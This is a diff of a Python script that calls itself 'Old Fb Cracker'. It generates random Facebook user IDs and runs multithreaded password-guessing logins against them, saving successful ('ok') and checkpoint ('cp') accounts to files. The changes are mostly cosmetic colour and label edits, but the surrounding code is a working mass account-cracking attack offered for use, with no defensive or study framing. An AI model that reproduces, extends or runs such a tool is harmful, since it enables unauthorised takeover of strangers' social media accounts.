@@ -35,7 +35,7 @@ def runtxt(z):
     for e in z + "\n":
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.03)
+        time.sleep(0.01)
  
  
 plist = (platform.uname())[2]
@@ -95,11 +95,11 @@ $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : DON'T TRY TO BYPASS 
 \033[1;90m══════════════════════════════════════════════════
     """)
-		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
-		print("%s [%s•%s] %sVERSION   : %s5.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,B,G,R,F))
+		print("%s [%s•%s] %sVERSION   : %s5.0"%(G,C,S,B,R))
 		print("")
 		print("\n    \033[0;92m            UID CLONING \033[0;97m ")
-		print("%s [%s1%s]%s CRACK RANDOM FB ID 2004-16 {JUST NOW} %s(FREE)"%(G,R,G,Y,B))
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2004-16 {JUST NOW} %s(Green)"%(G,R,B,Y,Y))
 		tanya = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
 		if tanya in ["", " "]:
 			Main()
@@ -109,7 +109,7 @@ $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 	def fbtua(self):
 		x = 111111111
 		xx = 999999999
-		idx = "100000" 
+		ids = "1000000" 
 		limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 150000): "))
 		try:
 			for n in range(limit):
@@ -118,15 +118,15 @@ $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 				self.id.append(__+str(_))
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
-				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(R,G,M,N))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(R,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(R,G))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
-				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(G))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n    [#] CRACK COMPLETE...")
